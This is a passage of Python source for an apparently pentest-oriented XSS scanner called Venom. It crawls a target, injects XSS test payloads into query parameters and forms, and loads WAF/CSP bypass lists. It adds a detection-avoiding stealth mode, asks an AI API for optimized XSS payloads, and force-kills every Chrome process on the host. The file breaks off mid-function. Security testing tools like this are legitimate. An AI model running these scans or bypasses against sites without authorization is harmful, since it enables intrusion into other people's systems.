#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import subprocess
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException, SSLError, Timeout
from concurrent.futures import ThreadPoolExecutor
from selenium.common.exceptions import WebDriverException, UnexpectedAlertPresentException, TimeoutException, NoAlertPresentException
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.common.keys import Keys
import random
import tempfile
import shutil
from pathlib import Path

# Setup logging
log_file = "venom.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_file, mode='a', encoding='utf-8'), logging.StreamHandler()]
)
logging.info("Logging initialized successfully")

# Colors
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'

# Thread-safe counter
class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def get_banner_and_features() -> str:
    banner = f"""
{GREEN}╔════════════════════════════════════════════════════════════════════╗{RESET}
{GREEN}║          ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗           ║{RESET}
{GREEN}║          ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║           ║{RESET}
{GREEN}║          ██║   ██║█████╗  ██╔██╗ ██║██║   ██╗██╔████╔██║           ║{RESET}
{GREEN}║          ██║   ██║██╔══╝  ██║╚██╗██║██║   ██╗██║╚██╔╝██║           ║{RESET}
{GREEN}║          ╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║           ║{RESET}
{GREEN}║           ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝           ║{RESET}
{GREEN}║                                                                    ║{RESET}
{GREEN}║                  Venom Advanced XSS Scanner 2025                   ║{RESET}
{GREEN}║                            Version 5.13                            ║{RESET}
{GREEN}║    Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER    ║{RESET}
{GREEN}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        "Advanced XSS detection with dynamic input analysis",
        "Improved WebDriver stability and connection handling",
        "Enhanced Reflected XSS detection without execution requirement",
        "WAF/CSP detection and bypass capabilities",
        "Payloads sourced from local files and GitHub",
        "AI-driven payload optimization (with API key)",
        "Stealth mode for discreet scanning"
    ]
    return banner + "\nCore Features:\n" + "\n".join(f"{GREEN}➤ {feature}{RESET}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional-grade tool crafted for ethical penetration testers to identify Cross-Site Scripting (XSS) vulnerabilities in web applications. Developed by Yaniv Avisror, a veteran penetration tester and ethical hacker, Venom integrates a headless Chrome WebDriver for accurate vulnerability validation, supports WAF/CSP bypass, and offers optional AI-enhanced payload optimization. Ideal for security professionals, it provides detailed, actionable insights with a focus on stealth and precision.

Usage:
  python3 venom.py <url> [options]

Arguments:
  url                   Target URL to scan (e.g., https://example.com)

Options:
  -h, --help            Show this help message and exit
  -w, --workers         Number of concurrent threads (default: 5, capped at 2 in stealth mode)
  --ai-assist           Enable AI-driven payload optimization (requires --ai-key)
  --ai-key              API key for AI assistance (e.g., xAI key)
  --browser             Browser for DOM testing (default: chrome, only 'chrome' supported)
  --scan-xss            Enable XSS scanning (required)
  --payloads-dir        Directory with custom payload files (default: ./payloads/)
  --timeout             HTTP request timeout in seconds (default: 10)
  --webdriver-timeout   WebDriver wait timeout in seconds (default: 10)
  --headless            Run browser in headless mode (default: False)
  --verbose             Enable detailed logging for diagnostics
  --stealth             Activate stealth mode for low-visibility scanning
  --min-delay           Min delay between tests in seconds (default: 5 in stealth, 0.5 otherwise)
  --max-delay           Max delay between tests in seconds (default: 15 in stealth, 1.5 otherwise)
  --full-report         Show all vulnerabilities in report (default: first 10)
  -H                    Custom HTTP headers (e.g., -H 'User-Agent: Mozilla/5.0')
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization")
    parser.add_argument("--ai-key", type=str, default=None, help="API key for AI assistance")
    parser.add_argument("--browser", choices=["chrome"], default="chrome", help="Browser for DOM testing")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required)", required=True)
    parser.add_argument("--payloads-dir", default="./payloads/", help="Directory with custom payload files")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds")
    parser.add_argument("--webdriver-timeout", type=int, default=10, help="WebDriver wait timeout in seconds")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode", default=False)
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode", default=False)
    parser.add_argument("--min-delay", type=float, help="Min delay between tests in seconds")
    parser.add_argument("--max-delay", type=float, help="Max delay between tests in seconds")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in report")
    parser.add_argument("-H", action='append', help="Custom HTTP headers", default=[])

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode enabled: Workers limited to {args.workers}, Delays: {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.5
        args.max_delay = args.max_delay if args.max_delay is not None else 1.5
    if args.ai_assist and not args.ai_key:
        print(f"{YELLOW}[!] Warning: --ai-assist enabled without --ai-key. Using default payload enhancement.{RESET}")
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command executed: {command}{RESET}")
    return args

def fetch_payloads_from_github(urls: List[str], timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.13'}
    for url in urls:
        try:
            response = requests.get(url, headers=headers, timeout=timeout)
            response.raise_for_status()
            content = response.text
            extracted = re.findall(r'`([^`]+)`', content)
            payloads.extend([sanitize_input(p.strip()) for p in extracted if p.strip() and '<' in p])
            logging.info(f"Fetched {len(extracted)} payloads from {url}")
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<script>console.log('XSS')</script>",
            "<img src=x onerror=console.log('XSS')>",
            "<script>document.domain</script>",
            "<script>setTimeout(() => console.log('XSS'), 100)</script>",
            "javascript:alert('XSS')"  # Added for direct JS execution
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.warning(f"Payloads directory {self.payloads_dir} not found; using defaults.")
            return stealth_payloads if self.stealth else default_payloads
        
        if self.bypass_needed:
            bypass_file = os.path.join(self.payloads_dir, 'waf_bypass.txt')
            if os.path.exists(bypass_file):
                with open(bypass_file, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded bypass payloads from {bypass_file}")
            else:
                payloads = default_payloads
        elif self.use_403_bypass:
            bypass_file = os.path.join(self.payloads_dir, '403bypass.txt')
            if os.path.exists(bypass_file):
                with open(bypass_file, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded 403 bypass payloads from {bypass_file}")
            else:
                payloads = default_payloads
        else:
            xss_files = ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt']
            for filename in xss_files:
                file_path = os.path.join(self.payloads_dir, filename)
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded XSS payloads from {file_path}")
        
        if not self.stealth:
            github_urls = [
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md",
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md",
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md"
            ]
            github_payloads = fetch_payloads_from_github(github_urls, 15)
            payloads.extend(github_payloads)

        if not payloads:
            payloads = stealth_payloads if self.stealth else default_payloads
        
        logging.info(f"Loaded {len(payloads)} total payloads (local + GitHub)")
        return list(set(payloads))

    def generate(self) -> List[str]:
        return self.payloads

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, api_endpoint: str = None):
        self.payloads = payloads
        self.api_key = api_key
        self.api_endpoint = api_endpoint or os.getenv("AI_API_ENDPOINT", "https://api.example.com/completions")
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with API endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance disabled (no API key or endpoint provided). Using default enhancement.")

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if 'alert(' in p.lower() or 'console.log(' in p.lower() or 'document.domain' in p.lower()]
        other_payloads = [p for p in self.payloads if 'alert(' not in p.lower() and 'console.log(' not in p.lower() and 'document.domain' not in p.lower()]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
            logging.info("Prioritizing shorter payloads due to timeouts or 404s.")
        
        if initial_run or not self.success_history:
            if self.api_key and self.api_endpoint and response:
                ai_suggestions = self.get_ai_suggestions(response)
                executable_payloads.extend(ai_suggestions)
                logging.info(f"AI-enhanced payload set generated: {len(ai_suggestions)} additional payloads added.")
            else:
                enhanced = [f"{p}XSS-{random.randint(1000, 9999)}" for p in executable_payloads[:5]]
                executable_payloads.extend(enhanced)
                logging.info(f"Default enhancement applied: {len(enhanced)} additional payloads added.")
            return list(set(executable_payloads + other_payloads))
        
        if response and self.api_key and self.api_endpoint:
            context = 'html' if '<' in response else 'js' if 'script' in response.lower() else 'unknown'
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0, "context": "unknown"})["weight"] * 
                                  (1.5 if context in self.success_history.get(p, {}).get("context", "") else 1) -
                                  (0.5 if status_code == 404 else 0),
                    reverse=True
                )
            ai_suggestions = self.get_ai_suggestions(response)
            sorted_payloads.extend(ai_suggestions)
            sorted_payloads.extend(other_payloads)
            sorted_payloads = list(set(sorted_payloads))
            logging.info(f"AI suggested {len(ai_suggestions)} payloads. Total: {len(sorted_payloads)}")
            return sorted_payloads
        
        return list(set(executable_payloads + other_payloads))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            data = {
                "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                "max_tokens": 100
            }
            parsed_url = urlparse(self.api_endpoint)
            if not (parsed_url.scheme in ['http', 'https'] and parsed_url.netloc):
                raise ValueError(f"Invalid AI API endpoint: {self.api_endpoint}")
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10)
            ai_response.raise_for_status()
            suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except (RequestException, ValueError) as e:
            logging.error(f"AI API call failed: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)
                logging.info(f"AI success recorded: {payload}, weight: {self.success_history[payload]['weight']}")

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=1), pool_maxsize=100))  # Increased pool size further
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=1), pool_maxsize=100))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/',
            'X-Requested-With': 'XMLHttpRequest'
        })
        if args.H:
            for header in args.H:
                try:
                    key, value = header.split(':', 1)
                    self.session.headers.update({sanitize_input(key.strip()): sanitize_input(value.strip())})
                except ValueError:
                    logging.warning(f"Invalid header format: {header}")
        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.start_time = time.time()
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_csp_status = "Unknown"
        self.bypass_performed = False
        self.waf_tech = None
        self.use_403_bypass = False
        self.temp_dirs = []
        self.webdriver_failures = 0

        self.initial_waf_csp_check()
        self.driver = self.setup_browser()
        self.executor = ThreadPoolExecutor(max_workers=args.workers)
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
        print(f"{GREEN}[+] AI Assistance: {'Enabled' if self.ai_assistant and self.args.ai_key else 'Enabled (Default Mode)' if self.args.ai_assist else 'Disabled'}{RESET}")

    def initial_waf_csp_check(self) -> None:
        try:
            response = self.session.get(self.args.url, timeout=self.args.timeout)
            headers = response.headers
            waf_indicators = {'cloudflare': 'cloudflare', 'akamai': 'akamai', 'sucuri': 'sucuri', 'mod_security': 'mod_security', 'generic': 'x-waf'}
            csp = headers.get('Content-Security-Policy', '')
            detected = False
            for tech, indicator in waf_indicators.items():
                if indicator.lower() in str(headers).lower():
                    self.waf_tech = tech
                    self.waf_csp_status = f"WAF detected ({tech})"
                    detected = True
                    logging.info(f"Initial check: WAF detected: {tech}")
                    break
            if not detected and csp:
                self.waf_csp_status = "CSP detected"
                detected = True
                logging.info("Initial check: CSP detected")
            
            if detected:
                print(f"{YELLOW}[!] Detected: {self.waf_csp_status}{RESET}")
                while True:
                    bypass = input(f"{YELLOW}[?] Attempt WAF/CSP bypass? (YES/NO): {RESET}").strip().upper()
                    if bypass == "YES":
                        self.bypass_performed = True
                        logging.info("User confirmed WAF/CSP bypass attempt.")
                        break
                    elif bypass == "NO":
                        logging.info("User declined WAF/CSP bypass.")
                        break
                    else:
                        print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")
            else:
                self.waf_csp_status = "No WAF/CSP detected"
                logging.info("Initial check: No WAF/CSP detected")
        except RequestException as e:
            logging.error(f"Initial WAF/CSP check failed: {e}")
            print(f"{YELLOW}[!] WAF/CSP check failed. Proceeding anyway.{RESET}")

    def setup_browser(self) -> Optional[webdriver.Chrome]:
        for _ in range(3):
            subprocess.run(['pkill', '-9', 'chromedriver'], check=False)
            subprocess.run(['pkill', '-9', 'chrome'], check=False)
            time.sleep(2)
            if not subprocess.run(['pgrep', 'chromedriver'], capture_output=True).stdout:
                break
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        for attempt in range(5):
            temp_dir = None
            try:
                temp_dir = tempfile.mkdtemp(prefix=f"venom_chrome_{int(time.time())}_")
                self.temp_dirs.append(temp_dir)
                options = ChromeOptions()
                if self.args.headless:
                    options.add_argument('--headless=new')
                options.add_argument('--no-sandbox')
                options.add_argument('--disable-dev-shm-usage')
                options.add_argument('--disable-gpu')
                options.add_argument('--disable-extensions')
                options.add_argument('--window-size=1920,1080')
                options.add_argument('--remote-debugging-port=0')
                options.add_argument(f'--user-agent={random.choice(user_agents)}')
                options.add_argument(f'--user-data-dir={temp_dir}')
                options.add_argument('--disable-background-networking')
                options.add_argument('--disable-client-side-phishing-detection')
                options.add_argument('--disable-hang-monitor')
                options.add_argument('--disable-features=IsolateOrigins,site-per-process')
                options.add_argument('--disable-web-security')  # Added to potentially bypass restrictions
                if attempt > 2:
                    options.add_argument('--disable-accelerated-2d-canvas')
                    options.add_argument('--disable-accelerated-video-decode')
                if self.bypass_performed and self.waf_tech == 'cloudflare':
                    options.add_argument('--disable-web-security')
                elif self.bypass_performed:
                    options.add_argument('--ignore-certificate-errors')
                if self.use_403_bypass:
                    options.add_argument('--ignore-certificate-errors')
                service = ChromeService(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=options)
                driver.set_page_load_timeout(self.args.timeout * 3)
                driver.execute_script("window.console.logs = []; console.log = function(msg) { window.console.logs.push(msg); };")
                driver.execute_script("window.domChanges = []; window.oldHTML = document.body.innerHTML; setInterval(() => { if (document.body.innerHTML !== window.oldHTML) { window.domChanges.push({time: Date.now(), html: document.body.innerHTML}); window.oldHTML = document.body.innerHTML; } }, 100);")
                logging.info(f"Chrome WebDriver initialized (Attempt {attempt+1}) with temp dir: {temp_dir}")
                self.webdriver_failures = 0
                return driver
            except WebDriverException as e:
                logging.error(f"Failed to initialize Chrome WebDriver (Attempt {attempt+1}): {e}")
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
                subprocess.run(['pkill', '-9', 'chromedriver'], check=False)
                subprocess.run(['pkill', '-9', 'chrome'], check=False)
                time.sleep(2 ** min(attempt, 3))
                self.webdriver_failures += 1
        print(f"{RED}[!] WebDriver failed after 5 attempts. Falling back to HTTP-only testing.{RESET}")
        return None

    def cleanup_browser(self) -> None:
        if self.driver:
            for _ in range(5):
                try:
                    self.driver.quit()
                    time.sleep(10)
                    logging.info("Chrome WebDriver closed successfully.")
                    break
                except WebDriverException as e:
                    logging.warning(f"Failed to close Chrome WebDriver cleanly (Attempt {_+1}): {e}")
                    time.sleep(10)
                    self.webdriver_failures += 1
            subprocess.run(['pkill', '-9', 'chromedriver'], check=False)
            subprocess.run(['pkill', '-9', 'chrome'], check=False)
            time.sleep(5)
        for temp_dir in self.temp_dirs:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
        self.temp_dirs.clear()
        self.driver = None

    def clear_alerts(self) -> None:
        try:
            while True:
                alert = Alert(self.driver)
                alert_text = alert.text
                alert.accept()
                logging.info(f"Cleared alert: {alert_text}")
                time.sleep(0.5)
        except NoAlertPresentException:
            pass
        except WebDriverException as e:
            logging.info(f"Error clearing alerts: {e}")

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.args.timeout, allow_redirects=True)
            logging.info(f"Connection check for {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            if len(response.text) < 100 or '<html' not in response.text.lower():
                print(f"{YELLOW}[!] Warning: Target {url} returned a minimal response ({len(response.text)} bytes). Consider testing a different URL with more content.{RESET}")
                return False
            return response.status_code < 400 or response.status_code in [403, 502]
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Connection check failed for {url}: {e}")
            print(f"{YELLOW}[!] Connection failed for {url}. Proceeding anyway.{RESET}")
            return False

    def calculate_total_tests(self, url: str, soup: BeautifulSoup) -> int:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and not tag.get('type') == 'hidden' and not tag.get('readonly') and not tag.get('disabled') and name not in param_keys:
                param_keys.append(name)
        form_params = sum(len(form.find_all(['input', 'textarea', 'select'])) for form in soup.find_all('form'))
        return len(self.payloads) * max(len(param_keys) + form_params, 1)

    def scan(self) -> None:
        logging.info(f"Starting scan on {self.args.url}")
        print(f"{GREEN}[+] Starting XSS scan on {self.args.url}{RESET}")
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] Scan aborted: Target URL is not suitable for testing.{RESET}")
            return
        self.crawl(self.args.url)
        
        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            while not self.task_queue.empty() and self.running:
                try:
                    task = self.task_queue.get(timeout=10)
                    executor.submit(task)
                    self.task_queue.task_done()
                    delay = random.uniform(self.args.min_delay, self.args.max_delay)
                    time.sleep(delay)
                except queue.Empty:
                    logging.warning("Task queue timeout. Completing scan.")
                    break
        
        self.running = False
        self._display_status()
        print("\n")
        self.report()

    def crawl(self, url: str, depth: int = 0, max_depth: int = 3) -> None:
        with self.lock:
            if url in self.visited_urls or depth > max_depth or urlparse(url).netloc != self.domain:
                return
            self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=self.args.timeout)
            if response.status_code == 403 and not self.use_403_bypass:
                logging.info(f"Received 403 for {url}. Switching to 403 bypass.")
                self.use_403_bypass = True
                self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
                self.payloads = self.payload_generator.generate()
                with self.lock:
                    self.total_payloads = len(self.payloads)
                self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
                self.cleanup_browser()
                self.driver = self.setup_browser()
            logging.info(f"Crawled {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            soup = BeautifulSoup(response.text, 'html.parser')
            with self.lock:
                self.total_payloads += self.calculate_total_tests(url, soup) - len(self.payloads)
            payloads = self.ai_assistant.suggest_payloads(response.text, initial_run=(depth == 0), status_code=response.status_code) if self.ai_assistant else self.payloads
            self.test_injection_points(url, response, soup, payloads)
            forms = soup.find_all('form')
            for form in forms:
                action = urljoin(url, form.get('action', ''))
                if urlparse(action).netloc == self.domain:
                    self.task_queue.put(lambda f=form, a=action, p=payloads: self.test_form(a, f, p))
            if self.driver:
                try:
                    self.driver.get(url)
                    WebDriverWait(self.driver, self.args.webdriver_timeout).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                    self.clear_alerts()
                    links = self.driver.find_elements(By.TAG_NAME, 'a')
                    logging.info(f"Found {len(links)} links on {url}")
                    for link in links:
                        href = link.get_attribute('href')
                        if href and urlparse(href).netloc == self.domain:
                            with self.lock:
                                if href not in self.visited_urls:
                                    self.task_queue.put(lambda h=href: self.crawl(h, depth + 1, max_depth))
                    for form in forms:
                        self.submit_form(url, form, payloads)
                except TimeoutException:
                    logging.warning(f"Timeout loading {url} in browser. Retrying.")
                    self.webdriver_failures += 1
                    if self.webdriver_failures < 5:
                        self.cleanup_browser()
                        self.driver = self.setup_browser()
                        if self.driver:
                            self.driver.get(url)
                except WebDriverException as e:
                    logging.warning(f"Browser crawl failed for {url}: {e}")
                    self.webdriver_failures += 1
                    if self.webdriver_failures < 5:
                        self.cleanup_browser()
                        self.driver = self.setup_browser()
            common_paths = ['/', '/about', '/contact', '/search', '/downloads', '/index.php', '/login', '/register']
            for path in common_paths:
                new_url = urljoin(url, path)
                with self.lock:
                    if new_url not in self.visited_urls and urlparse(new_url).netloc == self.domain:
                        self.task_queue.put(lambda u=new_url: self.crawl(u, depth + 1, max_depth))
        except RequestException as e:
            logging.error(f"HTTP crawl failed for {url}: {e}")
            print(f"{YELLOW}[!] Crawl failed for {url}. Skipping.{RESET}")

    def test_injection_points(self, url: str, response: requests.Response, soup: BeautifulSoup, payloads: List[str]) -> None:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and not tag.get('type') == 'hidden' and not tag.get('readonly') and not tag.get('disabled') and name not in param_keys:
                param_keys.append(name)
        if not param_keys or url.endswith('/login'):
            param_keys = ['log', 'pwd', 'rememberme', 'wp-submit', 'redirect_to', 'p']
            if not soup.find_all('form'):
                logging.warning(f"No forms found on {url}. Using default login parameters: {param_keys}")
                print(f"{YELLOW}[!] No forms detected on {url}. Testing default login parameters.{RESET}")
        param_keys = [k for k in param_keys if not k.startswith('http') and not k.startswith('javascript')]
        logging.info(f"Testing injection points with params: {param_keys} on {url}")
        print(f"{GREEN}[+] Testing injection points on {url} with {len(param_keys)} parameters{RESET}")
        base_url = url.split('?', 1)[0]
        for payload in payloads:
            self.current_payload = payload
            self.total_tests.increment()
            for param in param_keys:
                test_params = {param: payload}
                self.task_queue.put(lambda p=param, tp=test_params, pl=payload: self.test_request(base_url, tp, pl, 'get', injection_point=f"Query String ({p})"))

    def test_form(self, action: str, form: BeautifulSoup, payloads: List[str]) -> None:
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name') and inp.get('type') != 'hidden' and not inp.get('readonly') and not inp.get('disabled')}
        if not inputs:
            inputs = {tag.get('id') or f"unnamed_{i}": '' for i, tag in enumerate(form.find_all(['input', 'textarea', 'select'])) if tag.get('type') != 'hidden' and not tag.get('readonly') and not tag.get('disabled')}
        logging.info(f"Testing form inputs: {list(inputs.keys())} on {action}")
        print(f"{GREEN}[+] Testing form at {action} with {len(inputs)} inputs{RESET}")
        for name in inputs:
            for payload in payloads:
                self.current_payload = payload
                self.total_tests.increment()
                test_params = inputs.copy()
                test_params[name] = payload
                self.task_queue.put(lambda n=name, tp=test_params, pl=payload: self.test_request(action, tp, pl, 'post', injection_point=f"Form Field ({n})"))

    def submit_form(self, url: str, form: BeautifulSoup, payloads: List[str]) -> None:
        if not self.driver:
            return
        action = urljoin(url, form.get('action', ''))
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])
        form_data = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name') and inp.get('type') != 'hidden' and not inp.get('readonly') and not inp.get('disabled')}
        if not form_data:
            form_data = {inp.get('id') or f"unnamed_{i}": '' for i, inp in enumerate(inputs) if inp.get('type') != 'hidden' and not inp.get('readonly') and not inp.get('disabled')}
        for i in range(0, len(payloads), 5):
            batch = payloads[i:i+5]
            self.current_payload = ";".join(batch)
            self.total_tests.increment()
            for attempt in range(3):
                try:
                    self.driver.get(url)
                    time.sleep(2 if not self.args.stealth else random.uniform(5, 10))
                    WebDriverWait(self.driver, self.args.webdriver_timeout).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                    self.clear_alerts()
                    self.driver.execute_script("window.domChanges = []; window.oldHTML = document.body.innerHTML;")
                    for inp in inputs:
                        name = inp.get('name') or inp.get('id')
                        if name and inp.get('type') != 'hidden' and not inp.get('readonly') and not inp.get('disabled'):
                            try:
                                element = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, name)) if inp.get('name') else EC.presence_of_element_located((By.ID, name)))
                                self.driver.execute_script(f"arguments[0].value = '{';'.join(batch).replace('\'', '\\\'')}';", element)
                                logging.info(f"Filled input {name} with payload batch via JavaScript: {';'.join(batch)}")
                                if any('onfocus' in p.lower() for p in batch):
                                    self.driver.execute_script("arguments[0].focus();", element)
